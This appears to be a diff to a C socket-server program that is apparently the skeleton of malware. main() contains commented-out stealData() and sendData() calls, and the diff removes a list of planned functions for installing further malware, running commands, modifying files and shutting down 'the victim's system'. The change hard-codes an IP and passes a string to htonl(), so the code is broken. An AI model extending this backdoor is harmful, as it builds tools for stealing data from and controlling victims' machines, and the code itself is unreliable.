@@ -14,7 +14,7 @@ int listen_fd, conn_fd;
 struct sockaddr_in serv_addr;
 char buffer[1024];
 
-void createSocket() {
+void createSocket(char* addr) {
     // Create a socket and bind it to a port
     listen_fd = socket(AF_INET, SOCK_STREAM, 0);
     if (listen_fd < 0) {
@@ -23,7 +23,7 @@ void createSocket() {
     }
     memset(&serv_addr, '0', sizeof(serv_addr));
     serv_addr.sin_family = AF_INET;
-    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    serv_addr.sin_addr.s_addr = htonl(addr);
     serv_addr.sin_port = htons(PORT);
     if (bind(listen_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
         fprintf(stderr, "Error binding socket\n");
@@ -35,6 +35,7 @@ void createSocket() {
         fprintf(stderr, "Error listening for connections\n");
         exit(1);
     }
+    printf("Success creating a socket!");
 }
 
 void acceptConnection() {
@@ -144,7 +145,7 @@ void closeConnection() {
 
 int main()
 {
-    createSocket();
+    createSocket("192.168.2.163");
     acceptConnection();
     //stealData();
     //sendData();
@@ -152,9 +153,3 @@ int main()
 
     return 0;
 }
-//installMalware(): installs additional malware on the victim's system.
-//executeCommand(): executes a command on the victim's system and returns the output.
-//accessFiles(): accesses and potentially modifies files on the victim's system.
-//changePermissions(): changes the permissions of files or directories on the victim's system.
-//executeScript(): executes a script on the victim's system.
-//shutdownSystem(): shuts down the victim's system.
